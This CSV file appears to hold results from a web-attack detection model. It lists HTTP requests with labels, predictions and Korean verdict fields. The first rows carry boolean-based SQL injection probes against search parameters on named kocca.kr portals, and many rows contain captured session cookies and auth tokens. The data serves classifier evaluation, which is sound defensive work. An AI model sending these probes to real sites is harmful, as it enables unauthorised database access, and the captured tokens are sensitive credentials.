Unnamed: 0,payload,label,code,CVE,cluster,pred,correct,result
27920,"GET /portal/bbs/view/B0000204/1926522.do?searchCnd=%29%29%29%20AND%209605%3D6259%20AND%20%28%28%288753%3D8753&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=200375&categorys=4&subcate=65&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=&qtp=&pageIndex=7 HTTP/1.1\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.6 Safari/525.13\r\nReferer: http://portal.kocca.kr:80/portal/bbs/view/B0000204/1926522.do\r\nHost: portal.kocca.kr\r\nCookie: KCSESSIONID=5LGlgkxJkS0zLXsXHMGC7c1rl1rFgH9TxHvR91QRQ6LRzj1xkcVg!-368784361!385399486\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close",1,SI,,0,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : searchCnd=%29%29%29%20AND%209605%3D6259%20AND%20%28%28%288753%3D8753
공격 유형 : SQL Injection"
26754,"GET /portal/bbs/view/B0000204/1926522.do?searchCnd=%27%29%29%20AND%206938%3D9763%20AND%20%28%28%27xozA%27%3D%27xozA&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=200375&categorys=4&subcate=65&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=&qtp=&pageIndex=7 HTTP/1.1\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/412 (KHTML, like Gecko) Safari/412\r\nReferer: http://portal.kocca.kr:80/portal/bbs/view/B0000204/1926522.do\r\nHost: portal.kocca.kr\r\nCookie: KCSESSIONID=NPt1gk8pPNJgjsDPcLxDGtKp1hHLyg1sJyl7CnhrTFzDYWFL1R1v!-368784361!385399486\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close",1,SI,,0,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : searchCnd=%27%29%29%20AND%206938%3D9763%20AND%20%28%28%27xozA%27%3D%27xozA&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=200375&categorys=4&subcate=65&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=&qtp=&pageIndex=7
공격 유형 : SQL Injection"
30186,"GET /portal/bbs/view/B0000204/1926522.do?searchCnd=%27%29%29%20AND%206868%3D1519%20AND%20%28%28%27RxuL%27%3D%27RxuL&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=200375&categorys=4&subcate=65&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=&qtp=&pageIndex=7 HTTP/1.1\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.211.4 Safari/532.0\r\nReferer: http://portal.kocca.kr:80/portal/bbs/view/B0000204/1926522.do\r\nHost: portal.kocca.kr\r\nCookie: KCSESSIONID=yXM0gk3LyGLS36cSQ2TjqDDxphT41QqZ5c8fWNFxsSd6vvCjly10!385399486!-368784361\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close",1,SI,,0,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : searchCnd=%27%29%29%20AND%206868%3D1519%20AND%20%28%28%27RxuL%27%3D%27RxuL
공격 유형 : SQL Injection"
5312,"GET /cop/bbs/view/B0000144/1818887.do?searchCnd=%29%29%20AND%202701%3D9643%20AND%20%28%286781%3D6781&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=200900&categorys=0&subcate=0&cateCode=&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=&qtp=&pageIndex=1 HTTP/1.1\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/125.5.5 (KHTML, like Gecko) Safari/125.12\r\nCookie: KCSESSIONID=LBJ0grLQjQPF7t4c0ZhQSmZTFvf0vh3LKlBvrgGTG1H1JrGG7skv!-368784361!385399486\r\nHost: m.kocca.or.kr\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close",1,SI,,0,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : searchCnd=%29%29%20AND%202701%3D9643%20AND%20%28%286781%3D6781
공격 유형 : SQL Injection"
29254,"GET /portal/bbs/list/B0000204.do?searchCnd=%22%29%20AND%202451%3D2451%20AND%20%28%22NbEI%22%3D%22NbEI&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=201219&categorys=3&subcate=55&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=0&qtp=&searchGenre=&pageIndex=14 HTTP/1.1\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2; .NET CLR 1.1.4322; .NET4.0C; Tablet PC 2.0)\r\nReferer: http://bestgame.kocca.kr:80/portal/bbs/list/B0000204.do\r\nHost: bestgame.kocca.kr\r\nCookie: KCSESSIONID=RyRLgt7ptTh19xNyHSHGnrRY5j7jhq5XrCGz2yP3H4WhR0Hs0QGL!1739629523!965280821\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close",1,SI,,0,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 유형 : SQL Injection"
18084,GET /portal/bbs/list/B0000204.do?searchCnd=&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=200207&categorys=2&subcate=50&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208&option2=%20and%201%3E1 HTTP/1.1\r\nHost: chn.kocca.kr\r\nAccept: */*,1,SI,,0,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : option2=%20and%201%3E1
공격 유형 : SQL Injection"
28862,"GET /portal/bbs/list/B0000204.do?searchCnd=%22%20AND%202451%3D2451%20AND%20%22aRzV%22%20LIKE%20%22aRzV&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=201219&categorys=3&subcate=55&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=0&qtp=&searchGenre=&pageIndex=14 HTTP/1.1\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2; .NET CLR 1.1.4322; .NET4.0C; Tablet PC 2.0)\r\nReferer: http://bestgame.kocca.kr:80/portal/bbs/list/B0000204.do\r\nHost: bestgame.kocca.kr\r\nCookie: KCSESSIONID=RyRLgt7ptTh19xNyHSHGnrRY5j7jhq5XrCGz2yP3H4WhR0Hs0QGL!1739629523!965280821\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close",1,SI,,0,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : searchCnd=%22%20AND%202451%3D2451%20AND%20%22aRzV%22%20LIKE%20%22aRzV
공격 유형 : SQL Injection"
100678,"GET /nrb/styles/satellite/1685681400/17/111834/50752.png?mt=bg.ol.sw.lp HTTP/1.1
Host: map.pstatic.net
Connection: keep-alive
sec-ch-ua: ""Not.A/Brand"";v=""8"", ""Chromium"";v=""114"", ""Google Chrome"";v=""114""
accept: image/webp,*/*
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
sec-ch-ua-platform: ""Windows""
Origin: https://map.naver.com
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://map.naver.com/
Accept-Encoding: gzip, deflate, br
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7

",0,Not Attack,,1,0,True,"공격 여부(0:비공격, 1:공격) : 0
공격 구문 : nan
공격 유형 : nan"
97654,"GET /thumb/C220x120/?fname=https%3A%2F%2Fshop2.daumcdn.net%2Fshophow%2Fp%2FX1790043917.jpg%3Fut%3D HTTP/1.1
Host: shop2.daumcdn.net
Connection: keep-alive
sec-ch-ua: ""Not.A/Brand"";v=""8"", ""Chromium"";v=""114"", ""Microsoft Edge"";v=""114""
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.41
sec-ch-ua-platform: ""Windows""
Accept: image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://shop-redapi.daum.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: ko,en;q=0.9,en-US;q=0.8

",0,Not Attack,,1,0,True,"공격 여부(0:비공격, 1:공격) : 0
공격 구문 : nan
공격 유형 : nan"
108786,"GET /assets/css/libs.css HTTP/1.1
Host: entercdn.ipsosinteractive.com
Connection: keep-alive
sec-ch-ua: ""Chromium"";v=""112"", ""Microsoft Edge"";v=""112"", ""Not:A-Brand"";v=""99""
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.58
sec-ch-ua-platform: ""Windows""
Accept: text/css,*/*;q=0.1
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: style
Referer: https://enter.ipsosinteractive.com/
Accept-Encoding: gzip, deflate, br
Accept-Language: ko,en;q=0.9,en-US;q=0.8
Cookie: consent=1; DG=""9vZ8bVZMbdfgkAYd49uDdDczyqAq4bqSMdz1g3Rb8utoP3V1KpMgVE+5UzgsAqdFMpUsXqntlz0TOplFJby9dPrEP2iziASwJYTfqSt0pGiVJxHURM+Swha8cqQKWrrNhfljl8W/NzgMpQmV+P/OM1afe+6cyvEis90TvELafvRZMcwRE2/Zqa9+A0hfvyKPIvWp29qG2QKkLmGJA/Z8jIO01FI/v6Kzw2aNft9/1E+9rFeS7mQudQ3FPfq+U3rLxsSXKK1JQQCpjnuWlT+5jfpSmT/SA8pZLlUINVLRnkaHgf9xa6SwCFyDiPwaQu+f3/3uNJbYt25Xg13ISxoh8EsOhmiN9zDCQPUpavTyly2hQAuqwkYyEP+v0S4DYhtbXMIXr7cTvy1HDn3b1Pfb4w==""

",0,Not Attack,,1,0,True,"공격 여부(0:비공격, 1:공격) : 0
공격 유형 : 해당 요청은 일반적인 CSS 파일 로드 요청으로 보입니다. 악의적인 페이로드를 감지할 수 없습니다."
98740,"GET /MjAyMzAyMjBfMTU0/MDAxNjc2OTAwNjY4MTE2.l-vnDk-r_N3aS_oq6KD6jkcuFQ5fvi_xx9vK5b99tVsg.xDxJlF-ov2IdtEkhucT9sOeyh6ARCu72cJ5TSLKXAoUg.JPEG.jml012/SE-44c0be8b-b122-11ed-a01b-a5cd2f4d07a2.jpg?type=w966 HTTP/1.1
Host: postfiles.pstatic.net
Connection: keep-alive
sec-ch-ua: ""Not.A/Brand"";v=""8"", ""Chromium"";v=""114"", ""Google Chrome"";v=""114""
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
sec-ch-ua-platform: ""Windows""
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://blog.naver.com/PostView.naver?blogId=jml012&logNo=223022295673&redirect=Dlog&widgetTypeCall=true&topReferer=https%3A%2F%2Fsearch.naver.com%2Fsearch.naver%3Fsm%3Dtab_hty.top%26where%3Dview%26query%3D%25ED%258C%258C%25EB%2593%259C%25EB%25A7%2588%2B%25ED%2582%25A4%25EC%25A6%2588%25ED%2581%25B4%25EB%259F%25BD%26oquery%3D%25EB%25A7%2588%25EB%259D%25BC%25EB%25A6%25AC%25EB%25B2%2584%2B%25EA%25B7%25BC%25EC%25B2%2598%2B%25EB%25A7%2588%25EC%2582%25AC%25EC%25A7%2580%26tqi%3Di47NOdprvh8ssm%252Bihl8ssssssNo-421026%26mode%3Dnormal&directAccess=false
Accept-Encoding: gzip, deflate, br
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7

",0,Not Attack,,1,0,True,"공격 여부(0:비공격, 1:공격) : 0
공격 구문 : nan
공격 유형 : nan"
113675,"GET /template/resources/images/cont/webtoon-3.jpg HTTP/1.1
Host: www.ncsc.go.kr:4018
Connection: keep-alive
sec-ch-ua: ""Whale"";v=""3"", ""Not-A.Brand"";v=""8"", ""Chromium"";v=""110""
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Whale/3.19.166.16 Safari/537.36
sec-ch-ua-platform: ""Windows""
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://www.ncsc.go.kr:4018/PageLink.do?link=forward:/PageContent.do&tempParam1=&menuNo=010000&subMenuNo=010200&thirdMenuNo=010201
Accept-Encoding: gzip, deflate, br
Accept-Language: ko-KR,ko;q=0.9
Cookie: WMONID=mJSNj1JXhiW; JSESSIONID=Q1HUxnVrQrM1k45ja7zMTO8DwkNPI9Jv9twDl3waubRdFO9zxUtt14In8A0vOo7V.nweb3_servlet_ncsc

",0,Not Attack,,1,0,True,"공격 여부(0:비공격, 1:공격) : 0
공격 구문 : nan
공격 유형 : nan"
96726,"POST /track HTTP/1.1
Host: stat.tiara.daum.net
Connection: keep-alive
Content-Length: 3509
sec-ch-ua: ""Not.A/Brand"";v=""8"", ""Chromium"";v=""114"", ""Google Chrome"";v=""114""
sec-ch-ua-platform: ""Windows""
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Content-Type: text/plain
Accept: */*
Origin: https://www.daum.net
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://www.daum.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: TUID=w-p8lFrNcQtqL8_230510134314111; UUID=MQDG9uuSyON85kKdC66YHSxcKsuCiYjXJ4C2xCVd_HNnGhMEcTcBjw00; webid=5878a176eb07443a830f338f29c889ae; webid_ts=1683694396742; TIARA=Wk5IS7tLWlmZnnrZOCJ5b-xApvoz.GgFipJHbVCTC1bKbsuKpOsxcD62UY9cLBSuRPidlaw6AG2gc2jzU_72uplxvFLIVQ2giJfhvRlw6750; TSID=w-JAVyetkbeLll_230609090153726; _SUID=w-bpYmmOiT6yz0_230609680364270; _ISUID=w-qfbB2cBu8vU6_230609091654853; webid_sync=1686298367870; _T_ANO=FykkDsuPTe0bfxv1dNp/lv2fYVmTXB0Lg193FK/CsIDB3aQHBBLeKvwKnWOzFUaEBIz/gT8FGhFVNgvC0wVN/4Q89LfZBzqBvgyaWVY6SR2s6mndTbZiJRaojYHiK+gceGWJyRiNnSzguD+1poVWte4VJdRaHgJXNC3INvppa/CG6FkWdznfQjz7qTK8qaoOXeTsW2X3C1bUIaI0PcN4qHr1FhxV3xLlKYbctsoNsGijnKgldw9pcVPrsRwFUpG3wvSdTauxhzSP0flHCtVMjnoC000cbXvfvGj610fPta5PMmuYGy1a5JRrDixR0QUXsB1uIck9nLWu3oyrHmPyTg==

{""sdk"":{""type"":""WEB"",""version"":""1.1.27""},""env"":{""screen"":""1920X1",0,Not Attack,,1,0,True,"공격 여부(0:비공격, 1:공격) : 0
공격 구문 : nan
공격 유형 : nan"
110213,"GET /cmm/fms/getImage.do?atchFileId=FILE_000000000003540&fileSn=0&noimageFileNum=EducationData HTTP/1.1
Host: www.ncsc.go.kr:4018
Connection: keep-alive
sec-ch-ua: ""Whale"";v=""3"", ""Not-A.Brand"";v=""8"", ""Chromium"";v=""112""
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Whale/3.20.182.12 Safari/537.36
sec-ch-ua-platform: ""Windows""
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://www.ncsc.go.kr:4018/PageLink.do
Accept-Encoding: gzip, deflate, br
Accept-Language: ko-KR,ko;q=0.9
Cookie: WMONID=NyR3rMVAnzN; JSESSIONID=aZbpYDOBMjSvcTXpaae4rwHOLLjkXlNSkuY5M4HAAG3GFCVlxK8H3khf81STr9lq.nweb1_servlet_ncsc

",0,Not Attack,,1,0,True,"공격 여부(0:비공격, 1:공격) : 0
공격 구문 : nan
공격 유형 : nan"
96810,"GET /serving/cookie/match/?party=1&google_gid=CAESEK3vlZUOA4Ftw48iu6DFZMs&google_cver=1&google_push=ATf1kGM-tnkX9wBCiH7Gp1-7-a9NX-wGHU7ctP-xFv0_nGu6GTfYw3bfyZMyAB0ZUnAWDrm8rGHZYAXzzB0F8bzdAmBLuYcuYZM-mQ HTTP/1.1
Host: c1.adform.net
Connection: keep-alive
sec-ch-ua: ""Not.A/Brand"";v=""8"", ""Chromium"";v=""114"", ""Google Chrome"";v=""114""
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
sec-ch-ua-platform: ""Windows""
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://pagead2.googlesyndication.com/
Accept-Encoding: gzip, deflate, br
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: C=1; uid=4434594283084278685

",0,Not Attack,,1,0,True,"공격 여부(0:비공격, 1:공격) : 0
공격 구문 : nan
공격 유형 : nan"
95274,"GET /v1/shopad/static/shopad-square-node/v2305301542/_next/static/uu78naNX3_rmPpd5S6rtf/_middlewareManifest.js HTTP/1.1
Host: spastatic.naver.com
Connection: keep-alive
sec-ch-ua: ""Not.A/Brand"";v=""8"", ""Chromium"";v=""114"", ""Microsoft Edge"";v=""114""
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.41
sec-ch-ua-platform: ""Windows""
Accept: */*
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: script
Referer: https://shopsquare.naver.com/mens
Accept-Encoding: gzip, deflate, br
Accept-Language: ko,en;q=0.9,en-US;q=0.8
Cookie: ASID=0e27d8fd000001764a548ba90000004e; NNB=WEP3WRVY7O5F6; NFS=2; _ga=GA1.2.1513182144.1619053884; _fbp=fb.1.1679962048589.860152916; _tt_enable_cookie=1; _ttp=AcP9meW3ouQvqKZJj3fr2D9mSjo; _ga_4BKHBFKFK0=GS1.1.1679978085.2.0.1679978085.60.0.0; NV_WETR_LOCATION_RGN_M=""MDYxMTAxMDE=""; NV_WETR_LAST_ACCESS_RGN_M=""MDYxMTAxMDE=""; NID_AUT=HgoMr0iwCZ07466BJVNHM9X5DurPJ1HgpMruvfPHeQgW19q9aWl8ZYSMiNv9C6yB; NID_JKL=Y3G4t+6SUyhhlk6rE4FDMt8JqG0YAnumi3VFjvlcusw=; nx_ssl=2; NID_SES=AAABky1k1Ek/uZThqi0vf9dLCyroX11lp4Hy8Uw5Dj+YnJw+gI17Nk10aa+WYywZSERsyvNPZIKF95duQXTq0V0t1gQcZiV6kbOy5Tj4VV54vypWKw3PzBUJb0nTO/6z17aTFrqOP2/vy4DE3oLYcTOFsnhGPL4YAkhmQSNhfdhJ+DDdcheONPNYLwCNzynXUq37xX5yCqAJBPmAsxQSli7BWS4n+IVU6",0,Not Attack,,1,0,True,"공격 여부(0:비공격, 1:공격) : 0
공격 구문 : nan
공격 유형 : nan"
99577,"GET /c.gif?CtsSyncId=802BD79FDA0E4114BF4FA44E7EDBA3A8&MUID=2225422334FD62A22D3050EF35D563AF HTTP/1.1
Host: c.clarity.ms
Connection: keep-alive
sec-ch-ua: ""Not.A/Brand"";v=""8"", ""Chromium"";v=""114"", ""Microsoft Edge"";v=""114""
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.41
sec-ch-ua-platform: ""Windows""
Accept: image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://www.microsoft.com/
Accept-Encoding: gzip, deflate, br
Accept-Language: ko,en;q=0.9,en-US;q=0.8
Cookie: MUID=2225422334FD62A22D3050EF35D563AF; MR=0; SM=T

",0,Not Attack,,1,0,True,"공격 여부(0:비공격, 1:공격) : 0
공격 구문 : nan
공격 유형 : nan"
85116,"GET /online.aw?v=2&uid=%E6%B1%9F%E8%8B%8F%E6%A0%BC%E5%B8%86%E5%AE%B6%E5%B1%85&site=cntaobao&s=2&charset=utf-8 HTTP/1.1
Host: amos.alicdn.com
Connection: keep-alive
sec-ch-ua: ""Not/A)Brand"";v=""99"", ""Google Chrome"";v=""115"", ""Chromium"";v=""115""
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
sec-ch-ua-platform: ""Windows""
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://item.taobao.com/item.htm?spm=a230r.1.14.59.65ba35e7lsdNBl&id=668543499927&ns=1&abbucket=15
Accept-Encoding: gzip, deflate, br
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: cna=k9ScGY/p5RwCAdM3APQ6zLaw; isg=BCQkk7avHFWhNW1j-ih9D8rT9SIWvUgngZTFQT5FsO-y6cSzZs0Yt1pIqVlxMYB_

",0,Not Attack,,1,0,True,"공격 여부(0:비공격, 1:공격) : 0
공격 구문 : nan
공격 유형 : nan"
106826,"GET /dmz-access-system/api/v2/manager/info/test_unidmz HTTP/1.1
Host: dmz.universe.go.kr
Connection: keep-alive
sec-ch-ua: ""Google Chrome"";v=""113"", ""Chromium"";v=""113"", ""Not-A.Brand"";v=""24""
sec-ch-ua-mobile: ?0
X-REFRESH-TOKEN: eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJtZW1iZXIiLCJqdGkiOiJ0ZXN0X21lbWJlciIsImlhdCI6MTY4Mzg2NzUzMCwiZXhwIjoxNjgzOTUzOTMwfQ.HxXfJZxZFO0JJ-XcDvWLY93_4wPa7MpHWvIRvj_wAe0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Content-Type: application/json
Accept: application/json, text/plain, */*
X-AUTH-TOKEN: eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJtZW1iZXIiLCJqdGkiOiJ0ZXN0X21lbWJlciIsImlhdCI6MTY4Mzg2NzUzMCwiZXhwIjoxNjgzODgxOTMwfQ.fMNRh2nUO70prD-Qa900ScDv9XBuMbMrj_GEwsoZHGg
sec-ch-ua-platform: ""Windows""
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://dmz.universe.go.kr/request
Accept-Encoding: gzip, deflate, br
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: JSESSIONID=AuiRKBoiGscDWKIEOTDQgunS-xo--MzmdRQzq6p7.dmz_external_was4; _ga=GA1.1.1395554193.1683181673; SCOUTER=x60754cdgenjqe; _ga_ZSS21GYMW1=GS1.1.1683702145.5.1.1683702162.0.0.0; _ga_W9R8599PY2=GS1.1.1683702145.5.1.1683702164.0.0.0; _ga_8S21HKPCSG=GS1.1.1683702147.5.1.1683702165.0.0.0

",0,Not Attack,,1,0,True,"공격 여부(0:비공격, 1:공격) : 0
공격 유형 : N/A
해당 요청은 보안 토큰 및 인증 토큰을 포함하여 API에 대한 정보를 요청하는 것으로 보이며 악의적인 목적을 갖춘 공격으로 보이지 않습니다."
100869,"POST /sc2/11/ HTTP/1.1
Host: tivan.naver.com
Connection: keep-alive
Content-Length: 911
sec-ch-ua: ""Not.A/Brand"";v=""8"", ""Chromium"";v=""114"", ""Microsoft Edge"";v=""114""
sec-ch-ua-platform: ""Windows""
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.41
Content-Type: application/x-www-form-urlencoded;charset=utf-8
Accept: */*
Origin: https://www.naver.com
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: empty
Referer: https://www.naver.com/
Accept-Encoding: gzip, deflate, br
Accept-Language: ko,en;q=0.9,en-US;q=0.8
Cookie: NNB=DUZ5IGCII4GGG; ASID=7d804320000001840c930efb0000006e

",0,Not Attack,,1,0,True,"공격 여부(0:비공격, 1:공격) : 0
공격 구문 : nan
공격 유형 : nan"
